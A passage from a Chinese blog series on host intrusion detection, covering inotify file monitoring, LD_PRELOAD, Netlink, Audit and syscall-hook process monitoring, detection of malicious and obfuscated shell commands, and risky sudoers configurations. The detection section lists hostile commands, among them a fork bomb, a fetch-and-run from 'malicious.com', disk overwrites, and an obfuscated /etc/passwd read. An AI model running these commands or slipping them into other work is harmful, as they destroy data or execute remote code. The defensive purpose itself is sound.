vfork创建的子进程与父进程共享数据段,而且由vfork()创建的子进程将先于父进程运行\n\n- `clone` Linux上创建线程一般使用的是pthread库 实际上linux也给我们提供了创建线程的系统调用，就是clone\n\n**注意：**当监控`clone`调用时候，需要剔除CLONE_THREAD\n\n**执行命命监控的是`execve`和`execveat`这两个系统调用。**\n\n- [execve](http://man7.org/linux/man-pages/man2/execve.2.html) 执行程序\n- [execveat](http://man7.org/linux/man-pages/man2/execveat.2.html) 执行一个关于目录描述符的程序\n\n# 网络监控\n\n和进程监控类似，只不过监控的是内核调用`connec`和`bind`\n\n```c++\nconst auto &event_data = boost::get<SyscallAuditEventData>(event.data);\n// 判断类别\nif (event_data.syscall_number == __NR_connect) {\n\trow[\"action\"] = \"connect\";\n} else if (event_data.syscall_number == __NR_bind) {\n\trow[\"action\"] = \"bind\";\n} else {\n\tcontinue;\n}\n```\n\n# 文件监控\n\n## 什么是inotify\n\ninotify是Linux中用于监控文件系统变化的一个框架，不同于前一个框架dnotify, inotify可以实现基于inode的文件监控。也就是说监控对象不再局限于目录，也包含了文件。不仅如此，在事件的通知方面，inotify摈弃了dnotify的信号方式，采用在文件系统的处理函数中放置hook函数的方式实现。\n\n在inotify中，对于一个文件或目录的监控被称为一个watch。 给某一个文件或目录添加一个watch就表示要对该文件添加某一类型的监控。监控的类型由一个掩码Mask表示，mask有：\n\n```\nIN_ACCESS ： 文件的读操作\n\nIN_ATTRIB ： 文件属性变化\n\nIN_CLOSE_WRITE ： 文件被关闭之前被写\n\nIN_CLOSE_NOWRITE ： 文件被关闭\n\nIN_CREATE ： 新建文件\n\nIN_DELETE ： 删除文件\n\nIN_MODIFY ： 修改文件\n\nIN_MOVE_SELF ： 被监控的文件或者目录被移动\n\nIN_MOVED_FROM ： 文件从被监控的目录中移出\n\nIN_MOVED_TO ： 文件从被监控的目录中移入\n\nIN_OPEN ： 文件被打开\n```\n\n## 原理\n\ninotify通过在文件系统的操作函数(vfs_open, vfs_unlink等)中插入hook函数改变代码的执行路径，从而产生相应的事件。以下是一个hook函数的列表： ![img](/images/a12/1.png) \n\n## 使用\n\nInotify 提供 3 个系统调用，它们可以构建各种各样的文件系统监控器：\n\n- `inotify_init()` 在内核中创建 inotify 子系统的一个实例，成功的话将返回一个文件描述符，失败则返回 -1。就像其他系统调用一样，如果 `inotify_init()` 失败，请检查 `errno` 以获得诊断信息。\n- 顾名思义，`inotify_add_watch()` 用于添加监视器。每个监视器必须提供一个路径名和相关事件的列表（每个事件由一个常量指定，比如 IN_MODIFY）。要监控多个事件，只需在事件之间使用逻辑操作符*或* — C 语言中的管道线（`|`）操作符。如果 `inotify_add_watch()` 成功，该调用会为已注册的监视器返回一个惟一的标识符；否则，返回 -1。使用这个标识符更改或删除相关的监视器。\n- `inotify_rm_watch()` 删除一个监视器。\n\n**监控创建、删除和修改事件的目录代码:**\n\n```c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n \n#define EVENT_SIZE  ( sizeof (struct inotify_event) )\n#define BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )\n \nint main( int argc, char **argv ) \n{\n  int length, i = 0;\n  int fd;\n  int wd;\n  char buffer[BUF_LEN];\n \n  fd = inotify_init();\n \n  if ( fd < 0 ) {\n    perror( \"inotify_init\" );\n  }\n \n  wd = inotify_add_watch( fd, \"/home/strike\", \n                         IN_MODIFY | IN_CREATE | IN_DELETE );\n  length = read( fd, buffer, BUF_LEN );  \n \n  if ( length < 0 ) {\n    perror( \"read\" );\n  }  \n \n  while ( i < length ) {\n    struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];\n    if ( event->len ) {\n      if ( event->mask & IN_CREATE ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was created.\\n\", event->name );       \n        }\n        else {\n          printf( \"The file %s was created.\\n\", event->name );\n        }\n      }\n      else if ( event->mask & IN_DELETE ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was deleted.\\n\", event->name );       \n        }\n        else {\n          printf( \"The file %s was deleted.\\n\", event->name );\n        }\n      }\n      else if ( event->mask & IN_MODIFY ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was modified.\\n\", event->name );\n        }\n        else {\n          printf( \"The file %s was modified.\\n\", event->name );\n        }\n      }\n    }\n    i += EVENT_SIZE + event->len;\n  }\n \n  ( void ) inotify_rm_watch( fd, wd );\n  ( void ) close( fd );\n \n  exit( 0 );\n}\n```\n\n1. 这个应用程序通过 `fd = inotify_init();` \n2. 创建一个 inotify 实例，并添加一个监视器来监控修改、新建、删除的文件（由 `wd = inotify_add_watch(...)` 指定）。\n3. `read()` 方法在一个或多个警告到达之前是被阻塞的。警告的详细内容 — 每个文件、每个事件 — 是以字节流的形式发送的；因此，应用程序中的循环将字节流转换成一系列事件结构。\n\n在文件 /usr/include/sys/inotify.h. 中，您可以找到事件结构的定义，它是一种 C 结构：\n\n```c++\nstruct inotify_event \n{\n  int wd;       /* The watch descriptor */\n  uint32_t mask;    /* Watch mask */\n  uint32_t cookie;  /* A cookie to tie two events together */\n  uint32_t len;     /* The length of the filename found in the name field */\n  char name __flexarr;  /* The name of the file, padding to the end with NULs */    \n} \n```\n\n\n\n# 总结\n\n进程、网络、文件的监控，都可以用上一章节hook系统调用的方式进行监控，但对于文件监控来说，因为linux自带了inotify的监控审计框架，我们可以直接通过用户态编程使用inotify的框架。对于进程和网络监控主要是对关键函数的hook，以及hook框架的选型。\n\n**参考：**\n\nhttps://www.sohu.com/a/244164762_467784\n\nhttps://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/","tags":["inotify","反入侵","内核监控","audit"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-内核监控方式","url":"/2019/04/23/反入侵策略总结-内核监控方式/","content":"\n转自 https://www.freebuf.com/column/208928.html，本文已归纳的很好，如有补充我直接补充在文章中不单独标注说明了.\n\n# 内核监控方式\n\n目前来看，常见的获取进程创建的信息的方式有以下四种：\n\n- So preload\n- Netlink Connector\n- Audit\n- Syscall hook\n\n# So preload\n\n## 原理\n\n1. Linux 中大部分的可执行程序是动态链接的，常用的有关进程执行的函数例如 `execve`均实现在 libc.so 这个动态链接库中。\n\n1. Linux 提供了一个 so preload 的机制，它允许定义优先加载的动态链接库，方便使用者有选择地载入不同动态链接库中的相同函数。\n\n结合上述两点不难得出，我们可以通过 so preload 来覆盖 libc.so 中的 `execve`等函数来监控进程的创建。\n\n## 演示\n\n1. 创建文件 hook.c ，内容如下：\n\n   ```c\n   #define _GNU_SOURCE\n   #include <stdio.h>\n   #include <unistd.h>\n   #include <dlfcn.h>\n   \n   typedef ssize_t (*execve_func_t)(const char* filename, char* const argv[], char* const envp[]);\n   static execve_func_t old_execve = NULL;\n   \n   int execve(const char* filename, char* const argv[], char* const envp[]) {\n   printf(\"Running hook\\n\");\n   printf(\"Program executed: %s\\n\", filename);\n   old_execve = dlsym(RTLD_NEXT, \"execve\");\n   return old_execve(filename, argv, envp);\n   }\n   ```\n\n   该文件的主要部分就是重新定义了 `execve`函数，在原始的 `execve`执行之前打印可执行文件的名字。\n\n2. 生成动态链接库：`gcc hook.c-fPIC-shared-o hook.so`\n\n3. 将上面生成的动态链接库注册成 preload ：`echo'/path/to/hook.so'>/etc/ld.so.preload`\n\n4. 退出当前 shell 并重新登录（下面会讲原因），执行命令即可看到我们编写的代码已被执行：\n\n![图片描述](/images/a11/1.png)\n\n## 使用条件\n\n该方法没有什么条件限制，只需有 root 权限即可**（做入侵监控程序 root 权限是必需的，后面的几种方法默认也都是在 root 权限下）**。\n\n## 优缺点\n\n**优点**\n\n- 轻量级，只修改库函数代码，不与内核进行交互。\n\n**缺点**\n\n- 只能影响在 preload 之后创建的进程\n\n- 无法监控静态链接的程序\n- 通过 `int80h`绕过 libc 直接调用系统调用\n\n# Netlink Connector\n\n## 原理\n\nNetlink 是一个套接字家族（socket family），它被用于内核与用户态进程以及用户态进程之间的 IPC 通信，我们常用的 `ss`命令就是通过 Netlink 与内核通信获取的信息。\n\nNetlink Connector 是一种 Netlink ，它的 Netlink 协议号是 `NETLINK_CONNECTOR`，其代码位于 [https://github.com/torvalds/linux/tree/master/drivers/connector](https://link.zhihu.com/?target=https%3A//github.com/torvalds/linux/tree/master/drivers/connector) 中，其中 connectors.c 和 cnqueue.c 是 Netlink Connector 的实现代码，而 cnproc.c 是一个应用实例，名为进程事件连接器，我们可以通过该连接器来实现对进程创建的监控。\n\n![图片描述](/images/a11/2.png)\n\n**具体流程：**\n\n ![图片描述](/images/a11/3.png)\n\n图中的 ncp 为 Netlink Connector Process，即用户态我们需要开发的程序。\n\n## 演示\n\n在 Github 上已有人基于进程事件连接器开发了一个简单的进程监控程序：[https://github.com/ggrandes-clones/pmon/blob/master/src/pmon.c](https://link.zhihu.com/?target=https%3A//github.com/ggrandes-clones/pmon/blob/master/src/pmon.c) ，其核心函数为以下三个：\n\n- `nl_connect`：与内核建立连接\n- `set_proc_ev_listen`：订阅进程事件\n- `handle_proc_ev`：处理进程事件\n\n其执行流程正如上图所示。\n\n我们通过 `gcc pmon.c-o pmon`生成可执行程序，然后执行该程序即可看到效果：\n\n![图片描述](/images/a11/4.png)\n\n获取到的 pid 之后，再去 `/proc/`目录下获取进程的详细信息即可。\n\n## 使用条件\n\n内核支持 Netlink Connector\n\n- 版本 > 2.6.14\n- 内核配置开启： `cat /boot/config-$(uname -r)|egrep 'CONFIG_CONNECTOR|CONFIG_PROC_EVENTS'`\n\n## 优缺点\n\n**优点**\n\n- 轻量级，在用户态即可获得内核提供的信息。\n\n**缺点**\n\n- 仅能获取到 pid ，详细信息需要查 `/proc/`，这就存在时间差，可能有数据丢失。\n\n# Audit\n\nLinux Audit 是 Linux 内核中用来进行审计的组件，可监控系统调用和文件访问。可用来\n\n- Watching file access\n- Monitoring system calls\n- Recording commands run by a user\n- Recording security events\n- Monitoring network access\n\n具体架构如下 :\n\n ![图片描述](/images/a11/5.png)\n\n1. 用户通过用户态的管理进程配置规则（例如图中的 go-audit ，也可替换为常用的 auditd ），并通过 Netlink 套接字通知给内核。\n2. 内核中的 kauditd 通过 Netlink 获取到规则并加载。\n3. 应用程序在调用系统调用和系统调用返回时都会经过 kauditd ，kauditd 会将这些事件记录下来并通过 Netlink 回传给用户态进程。\n4. 用户态进程解析事件日志并输出。\n\n## 演示\n\n从上面的架构图可知，整个框架分为用户态和内核态两部分，内核空间的 kauditd 是不可变的，用户态的程序是可以定制的，目前最常用的用户态程序就是 auditd ，除此之外知名的 [osquery](https://medium.com/palantir/auditing-with-osquery-part-one-introduction-to-the-linux-audit-framework-217967cec406) 在底层也是通过与 Audit 交互来获取进程事件。下面我们就简单介绍一下如何通过 auditd 来监控进程创建。\n\n首先安装并启动 auditd ：\n\n```\napt update && apt install auditd\nsystemctl start auditd && systemctl status auditd\n```\n\nauditd 软件包中含有一个命名行控制程序 `auditctl`，我们可以通过它在命令行中与 auditd 进行交互，用如下命令创建一个对 `execve`这个系统调用的监控：\n\n```\nauditctl -a exit,always -F arch=b64 -S execve\n```\n\n再通过 auditd 软件包中的 `ausearch`来检索 auditd 产生的日志：\n\n```\nausearch -sc execve | grep /usr/bin/id\n```\n\n整个过程的执行结果如下：\n\n![图片描述](/images/a11/6.png)\n\n至于其他的使用方法可以通过 `man auditd`和 `man auditctl`来查看。\n\n## 使用条件\n\n内核开启 Audit\n\n- `cat/boot/config-$(uname-r)|grep^CONFIG_AUDIT`\n\n## 优缺点\n\n**优点**\n\n- 组件完善，使用 auditd 软件包中的工具即可满足大部分需求，无需额外开发代码。\n- 相比于 Netlink Connector ，获取的信息更为全面，不仅仅是 pid 。\n\n**缺点**\n\n- 性能消耗随着进程数量提升有所上升，需要通过添加白名单等配置来限制其资源占用。\n\n**关于性能消耗：**\n\n开启了osquery的审计功能之后,会在两个方面存在性能损耗:\n\n1. 当开启了内核中审计功能之后并且存在审计规则，那么内核每次都会比对审计规则和实际产生的审计事件。\n2. 这个`audit consumer`(在本例中是`osquery`)将会从内核`netlink socket`中接受数据，然后将数据解析为了其内部定义的表的格式(`socket_events`和`process_events`)并保存在早RocksDB中。最后一旦这个数据被查询，那么这个数据就会被写入到文件或者是通过日志插件发送。\n\n每一次在内核中产生系统调用，就会产生相应的审计事件。如果这样的系统调用越多，那么内核产生这些系统调用的审计事件的工作量就越大，同时osquery解析这些审计事件并且保存在数据库中的工作量也越大。\n\n# Syscall hook\n\n上面的 Netlink Connector 和 Audit 都是 Linux 本身提供的监控系统调用的方法，如果我们想拥有更大程度的可定制化，我们就需要通过安装内核模块的方式来对系统调用进行 hook 。\n\n## 原理\n\n目前常用的 hook 方法是通过修改 `sys_call_table`（ Linux 系统调用表）来实现，具体原理就是系统在执行系统调用时是通过系统调用号在 `sys_call_table`中找到相应的函数进行调用，所以只要将 `sys_call_table`中 `execve`对应的地址改为我们安装的内核模块中的函数地址即可。\n\n上述具体的实现细节可参考 YSRC 的这篇关于驭龙 HIDS 如何实现进程监控的文章：[https://mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw) ，这里贴出文章里的一张图方便大家对整个流程有个直观地了解：\n\n ![图片描述](/images/a11/7.png)\n\n## 演示\n\n关于 Syscall hook 的 Demo ，我在 Github 上找了很多 Demo 代码，其中就包括驭龙 HIDS 的 hook 模块，但是这些都无法在我的机器上（ Ubuntu 16.04 Kernel 4.4.0-151-generic ）正常运行，这也就暴露了 Syscall hook 的兼容性问题。\n\n最后我决定使用 Sysdig 来进行演示，Sysdig 是一个开源的系统监控工具，其核心原理是通过内核模块监控系统调用，并将系统调用抽象成事件，用户根据这些事件定制检测规则。作为一个相对成熟的产品，Sysdig 的兼容性做得比较好，所以这里用它来演示，同时也可以方便大家自己进行测试。\n\n具体步骤如下：\n\n1.通过官方的安装脚本进行安装：\n\n```shell\ncurl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash\n```\n\n2.检测内核模块是否已经安全：`lsmod|grep sysdig`\n\n3.启动对 `execve`的监控：`sysdig evt.type=execve`\n\n最终的执行效果如下：\n\n![图片描述](/images/a11/8.png)\n\n有关于 Sysdig 的更多信息可以访问其 wiki 进行获取，另外，Sysdig 团队推出了一个专门用于安全监控的工具 Falco ，Falco 在 Sysdig 的基础上抽象出了可读性更高的检测规则，并支持在容器内部署，同样，大家如果感兴趣可以访问其 wiki 获取更多信息。\n\n## 使用条件\n\n- 可以安装内核模块。\n- 需针对不同 Linux 发行版和内核版本进行定制。\n\n## 优缺点\n\n**优点**\n\n- 高定制化，从系统调用层面获取完整信息。\n\n**缺点**\n\n- 开发难度大。\n- 兼容性差，需针对不同发行版和内核版本进行定制和测试。\n\n# 总结\n\n本文共讲了4种常见的监控进程创建的方法，这些方法本质上是对库函数或系统调用的监控，各有优劣，这里我再各用一句话总结一下：\n\n```\nSo preload ：Hook 库函数，不与内核交互，轻量但易被绕过。\nNetlink Connector ：从内核获取数据，监控系统调用，轻量，仅能直接获取 pid ，其他信息需要通过读取 proc/<pid>/来补全。\nAudit ：从内核获取数据，监控系统调用，功能多，不只监控进程创建，获取的信息相对全面。\nSyscall hook ：从内核获取数据，监控系统调用，最接近实际系统调用，定制度高，兼容性差。\n```\n\n对我个人来讲，单纯地看监控进程创建这方面，我还是更推荐使用 Netlink Connector 的方式，这种方式在保证从内核获取数据的前提下又足够轻量，方便进行定制化开发。如果是想要进行全方面的监控包括进程、网络和文件，Audit 是一个不错的选择。\n\n\n\n**参考：**\n\nhttps://blog.csdn.net/whuzm08/article/details/87267956\n\nhttps://blog.spoock.com/2019/01/13/auditing-with-osquery/\n\nhttps://segmentfault.com/a/1190000019828080\n\n[https://4hou.win/wordpress/?p...](https://4hou.win/wordpress/?p=29586)\n\n[https://tech.meituan.com/2019...](https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html)\n\n[https://www.ibm.com/developer...](https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html)\n\n[https://linux-audit.com/confi...](https://linux-audit.com/configuring-and-auditing-linux-systems-with-audit-daemon/)\n\n[https://my.oschina.net/macwe/...](https://my.oschina.net/macwe/blog/603583)\n\n[https://mp.weixin.qq.com/s/nt...](https://mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw)\n\n[https://mp.weixin.qq.com/s?__...](https://mp.weixin.qq.com/s?__biz=MzUzODQ0ODkyNA==&mid=2247483854&idx=2&sn=815883b02ab0000956959f78c3f31e2b&scene=21)\n\nhttps://github.com/draios/sysdig\n\n[https://github.com/falcosecur...](https://github.com/falcosecurity/falco)","tags":["反入侵","内核监控","audit","netlink","syscall"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-恶意命令检测","url":"/2019/04/09/反入侵策略总结-恶意命令检测/","content":"# Linux命令混淆\n\nLinux shell是脚本语言，有很多变种的执行方式。例如`cat /etc/passwd`就可以改成如下形式：\n\n```shell\ncat $(echo /e)tc$(echo /pa*)wd\n```\n\n其他绕过方式可以查看参考链接\n\n## 混淆方式\n\n根据开源的命令[混淆器](https://github.com/Bashfuscator/Bashfuscator)，来总结下混淆的几种方式。\n\n**五种类型突变：**\n\n1. 命令混淆\n   - 利用Linux环境中的命令或二进制文件行为的简单混淆器\n   - 混淆整个输入在一个块中\n2. 字符混淆\n   - 使用更高级特性/二进制的模糊处理程序\n   - 将输入分解成块，对这些块进行混淆，然后通过串联所有不同混淆块的标准输出来构建输入\n3. token混淆\n   - 利用Bash功能或行为混淆命令\n   - 通常不使用任何外部二进制文件\n   - 混淆整个输入在一个块中\n4. 编码\n   - 对整个输入进行编码，并使用存根对其进行解码。\n5. 压缩\n   - 使用Linux环境中常见的各种压缩器，使用存根压缩并解压缩输入\n\n使用`-l选项`可以列出所有的突变模块，并给出了大小和时间级别、描述等。\n\n**Command Obfuscators:**\n\n​\tName: Case Swapper\n\n​\tDescription: 相互转换所有大小写字符\n\n​\tName: Reverse\n\n​\tDescription: 反转一个命令\n\n**String Obfuscators:**\n\n​\tName: File Glob\n\n​\tDescription: 使用文件和glob排序重新组装字符串\n\n​\tName: Folder Glob\n\n​\tDescription: 使用文件和glob排序重新组装字符串\n\n​\tName: Hex Hash\n\n​\tDescription: 使用md5的输出对字符串进行编码\n\n**Token Obfuscators:**\n\n​\tName: ForCode\n\n​\tDescription: 打乱命令并在一个循环里恢复\n\n​\tName: Special Char Only\n\n​\tDescription: 将命令转换为只使用特殊字符\n\n**Encoders:**\n\n​\tName: Base64\n\n​\tDescription: Base64编码命令\n\n​\tName: RotN\n\n​\tDescription: 在ASCII字符集中将每个字符偏移随机次数\n\n​\tName: Xor Non Null\n\n​\tDescription: 使用perl中的xor运算符对字符串进行编码\n\n**Compressors:**\n\n​\tName: Bzip2\n\n​\tDescription: 使用bzip2压缩命令\n\n​\tName: Gzip\n\n​\tDescription: 使用gzip压缩命令\n\n## bash 调试功能\n\n经常使用shell的，大家都应该知道 sh -x 这个命令，sh其实是bash的软连接，本质上还是调用的bash。sh -x可以打印出shell脚本的运行过程，这样就可以看到真正的执行命令，但是有一点不好，就是它真的会把命令执行起来。**用它作为沙箱不合适，不仅浪费了检测的时间，还有可能被反调试**。\n\n那我们的想法便是使用阉割版的bash，仅把命令打印出来但不执行。实现这一功能需要去修改源码后重新编译。可以参考：https://cloud.tencent.com/developer/article/1369290\n\n# 恶意命令\n\n参考： https://techviral.net/dangerous-linux-commands/\n\n1. `:(){:|:&};:`\n2. `[command] > /dev/sda`\n3. `wget http://malicious.com -O | sh`\n4. `curl -s http://malicious.com`\n5. `dd if=something of=/dev/sda`\n6. `python -c \"[command]\"|perl -e \"[command]\"`\n\n## crontab命令检测\n\n这个信息在信息搜集模块搜集过，只要对每一条crontab匹配规则即可。\n\n## bash命令检测\n\n### 通过源码HOOK\n\n之前也讲过可以使用history命令查看历史记录，但是很容易被绕过，并且搜集不完整。这边提供两种思路搜集命令：\n\n1. 如果服务器是通过跳板机登录的，这个就好办了，跳板机会记录所有机器的操作命令，这样统一扫描就很方便。\n2. 第一种情况在运维环境比较可能，线上环境并非都通过跳板机登录的。这种情况可以上面类似的思路，修改bash源码来进行记录。 具体参考https://blog.51cto.com/koumm/1763145，通过修改bash的源码，把执行的命令通过[syslog](https://www.thegeekdiary.com/linux-os-service-syslog/)发送给服务端 。\n\n第二种情况也存在弊端，一是bash版本需要统一管理（母盘设置，初始化时其他系统继承母盘），二是linux中还存在其他[shell](https://www.jianshu.com/p/bc47aeb4f273)，需要也要hook源码，不然其他shell命令就无法记录了。\n\n### osquery检测逻辑\n\n再看看知名开源hids框架[osquery](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://www.freebuf.com/column/162604.html )是怎么检测的（毕竟facebook官方开源的，很有借鉴意义）：\n\n遍历所有的用户，拿到`uid`，`gid`和`directory`。之后调用`genShellHistoryForUser()`获取用户的shell记录`genShellHistoryFromBashSessions()`和`genShellHistoryForUser()`作用类似。\n\n**genShellHistoryForUser()**:\n\n```c++\nvoid genShellHistoryForUser(const std::string& uid, const std::string& gid, const std::string& directory, QueryData& results) {\n    auto dropper = DropPrivileges::get();\n    if (!dropper->dropTo(uid, gid)) {\n        VLOG(1) << \"Cannot drop privileges to UID \" << uid;\n        return;\n    }\n\n    for (const auto& hfile : kShellHistoryFiles) {\n        boost::filesystem::path history_file = directory;\n        history_file /= hfile;\n        genShellHistoryFromFile(uid, history_file, results);\n    }\n}\n```\n\n可以看到在执行之前调用了:\n\n```c++\nauto dropper = DropPrivileges::get();\nif (!dropper->dropTo(uid, gid)) {\n    VLOG(1) << \"Cannot drop privileges to UID \" << uid;\n    return;\n}\n```\n\n为什么对`gid`和`uid`降权， osquery一般都是使用root权限运行的，如果攻击者在`.bash_history`中注入了一段恶意的shellcode代码。那么当osquery读到了这个文件之后，攻击者就能够获取到root权限了，所以通过降权的方式就能够很好地避免这样的问题。\n\n之后遍历`kShellHistoryFiles`文件，执行`genShellHistoryFromFile()`代码。`kShellHistoryFiles`在之前已经定义，内容是：\n\n```c++\nconst std::vector<std::string> kShellHistoryFiles = {\n    \".bash_history\", \".zsh_history\", \".zhistory\", \".history\", \".sh_history\",\n};\n```\n\n可以发现其实在`kShellHistoryFiles`定义的就是常见的bash用于记录shell history目录的文件。最后调用`genShellHistoryFromFile()`读取`.history`文件，解析数据。\n\n```java\nvoid genShellHistoryFromFile(const std::string& uid, const boost::filesystem::path& history_file, QueryData& results) {\n    std::string history_content;\n    if (forensicReadFile(history_file, history_content).ok()) {\n        auto bash_timestamp_rx = xp::sregex::compile(\"^#(?P<timestamp>[0-9]+)$\");\n        auto zsh_timestamp_rx = xp::sregex::compile(\"^: {0,10}(?P<timestamp>[0-9]{1,11}):[0-9]+;(?P<command>.*)$\");\n        std::string prev_bash_timestamp;\n        for (const auto& line : split(history_content, \"\\n\")) {\n            xp::smatch bash_timestamp_matches;\n            xp::smatch zsh_timestamp_matches;\n\n            if (prev_bash_timestamp.empty() &&\n                xp::regex_search(line, bash_timestamp_matches, bash_timestamp_rx)) {\n                prev_bash_timestamp = bash_timestamp_matches[\"timestamp\"];\n                continue;\n            }\n\n            Row r;\n\n            if (!prev_bash_timestamp.empty()) {\n                r[\"time\"] = INTEGER(prev_bash_timestamp);\n                r[\"command\"] = line;\n                prev_bash_timestamp.clear();\n            } else if (xp::regex_search(\n                    line, zsh_timestamp_matches, zsh_timestamp_rx)) {\n                std::string timestamp = zsh_timestamp_matches[\"timestamp\"];\n                r[\"time\"] = INTEGER(timestamp);\n                r[\"command\"] = zsh_timestamp_matches[\"command\"];\n            } else {\n                r[\"time\"] = INTEGER(0);\n                r[\"command\"] = line;\n            }\n\n            r[\"uid\"] = uid;\n            r[\"history_file\"] = history_file.string();\n            results.push_back(r);\n        }\n    }\n}\n```\n\n整个代码逻辑非常地清晰。\n\n1. `forensicReadFile(history_file, history_content)`读取文件内容。\n2. 定义`bash_timestamp_rx`和`zsh_timestamp_rx`的正则表达式，用于解析对应的`.history`文件的内容。 `for (const auto& line : split(history_content, \"\\n\"))`读取文件的每一行，分别利用`bash_timestamp_rx`和`zsh_timestamp_rx`解析每一行的内容。\n3. `Row r;...;r[\"history_file\"] = history_file.string();results.push_back(r);`将解析之后的内容写入到Row中返回。\n\n`genShellHistoryFromBashSessions()`获取历史命令的方法比较简单。\n\n1. 获取到`.bash_sessions/*.history`所有的文件；\n2. 同样调用`genShellHistoryFromFile(uid, history_file, results);`方法获取到历史命令；\n\n# 总结\n\n一个检测项可能有多种的是实现方法，没有最好的方法，只有最适合的方法。选择哪种实现方式，还是要根据实际的情况来做衡量。\n\n单项检测可能无法做到尽善尽美，所以HIDS也是一种纵深检测的思路，后续介绍的命令执行检测的策略和bash历史命令检测相辅相成，相互补充。\n\n \n\n**参考：**\n\nhttp://caffeinesecurity.blogspot.com/2011/09/guide-to-malicious-linuxunix-commands.html\n\nhttps://techviral.net/dangerous-linux-commands/\n\nhttps://blog.spoock.com/2018/11/29/osquery-source-analysis-shell-history/\n\n[https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/](https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/)\n\n[https://www.smi1e.top/命令注入绕过姿势/](https://www.smi1e.top/命令注入绕过姿势/)","tags":["反入侵","命令混淆","history获取"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-基础检测","url":"/2019/04/05/反入侵策略总结-基础检测/","content":"\n# 基线检测\n\n基线检测应该是HIDS最基础的功能，不管是为了合规还是为了等保测试，基线应该说是最基础也是最重要的一项检测。\n\n## Sudoers检测\n\n配置用例： `user1 ALL=(ALL) NOPASSWD: ALL`\n\n[对应含义](https://blog.csdn.net/Field_Yang/article/details/51547804)： `用户 登录的主机=(可以变换的身份) 不需要密码执行: 可以执行的命令`\n\n**归纳五种危险的配置：**\n\n1. **未明确限制可以使用命令白名单的用户**\n\n   `ALL ALL=(root) NOPASSWD:CMD`\n\n   第一个ALL表示所有用户都可以使用申请的命令白命令。 该配置扩大了可以升权的用户范围，存在潜在提权风险。\n\n2. **未明确限制升权后的用户**\n\n   `username ALL=(ALL) NOPASSWD:CMD`\n\n   括号里ALL表示用户可以升权到任意用户（配置成root也是高风险），包括root和其他所有用户。该配置扩大了升权后的用户范围，存在潜在提权风险。\n\n3. **待升权命令的自身访问权限较低，存在被替换风险**\n\n   `user1 ALL=(root) NOPASSWD:/home/user1/test`\n\n   /home/user1/test的自身访问权限为user1。用户获得user1权限后，可以把该命令替换为某个破坏性命令导致提权。\n\n4. **待升权命令仅包含命令，而没有明确参数**\n\n   `username ALL=(root) NOPASSWD:/bin/bash`\n\n   配置了/bin/bash，没有限制对应的参数（执行的脚本），可导致执行任意脚本提权。\n\n5. **待升权命令中使用”\\*”不当**\n\n   `user1 ALL=(root) NOPASSWD:/sbin/ip netns exec qrouter-[0-9a-z]* timeout 5 /sbin/tcpdump -s 60 -c [1-3]*`\n\n   这里申请的命令/sbin/ip，不再是单独的命令，而是加上了参数，但是该参数中使用了通配符”*” 。 ”*”作为通配符，可以匹配任意个字符，包括空格，分号等。所以可以匹配任意命令。\n\n**检测规则：**\n\n1. 上面讲了5条基本的危险配置，可以简单的归结为`(可以变换的身份)`为`root|ALL`，后面为`NOPASSWD`就很可能存在风险。即可提炼出正则规则，配置告警。\n2. 根据实际情况，如果实际业务中上面的误报多，就可以对最后一步命令的进行进一步的监控过滤。可采取白名单或者黑名单命令的形式进行监控，黑名单命令例如：`su`、`sh`·、`rm`等（一切可能会危害系统的命令）。如果是加了参数，就监控参数中是否包含“*”号。\n\n## 不安全的加密算法\n\n1. 不安全的SSH 协议： 检测etc/ssh/sshd_config的Protocal是否支持SSH1\n2. 不安全/etc/shadow加密协议（弱口令检测讲解到）\n\n## 低版本软件\n\n**检测规则：**\n\n1. 根据信息搜集模块搜集到的版本信息，定义漏洞版本的规则，若匹配到规则则告警。包括但不限于：\n   - 内核系统低版本\n   - ssh低版本\n   - 各种DB低版本\n   - nginx低版本\n\n## 三方组件漏洞检测\n\n三方组件一般是检测CVE漏洞， 关于CVE漏洞库的匹配， [OWASP Dependency Check](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://github.com/jeremylong/DependencyCheck )这款工具可以检测，如何嵌入到主机扫描系统中：\n\n- 通过看OWASP Dependency Check源码自己实现类似的检测逻辑或者直接复用它的数据库，不过要定时更新。\n- 上述的逻辑最好是单独的一个模块或者组件，提供一个API接口，主机扫描系统只要输入对应的组件的版本信息，就能得到漏洞的反馈信息。\n\n# 基本检测\n\n## 特权账户检测\n\n**检测规则：**\n\n1. 通过之前的信息搜集模块搜集到的用户信息，判断是否存在uid=0且用户名不为root的特权账户。\n\n## 异常账户检测\n\n**检测规则：**\n\n1. 通过历史登录情况自动总结归纳常用登录账户和地点（或者提供添加白名单功能）\n2. 监控`/var/log/secure`或者`/var/log/auth.log`SSH的登陆情况，若存在成功事件并且用户不在白名单上，则告警。\n\n## 暴力破解检测\n\n**检测规则：**\n\n1. 依旧是就监控`/var/log/secure`或者`/var/log/auth.log`的登陆情况，定义一定的时间内某IP尝试登陆失败的次数大于某个阈值则告警。\n2. 大型互联网的机器可能经常受到攻击，不想每次都告警，可以在1的基础上加上特定条件-**失败多次后存在登陆成功的事件**，则告警。\n\n## 弱口令账户检测\n\n### 系统弱口令\n\nshadow中存放的[密码密文格式](http://www.voidcn.com/article/p-kkjoukbh-qg.html)如下：`$id$salt$encrypted`\n\n其中id是指使用的哈希算法，可取如下值：\n\n| ID   | Method                                                       |\n| ---- | ------------------------------------------------------------ |\n| 1    | 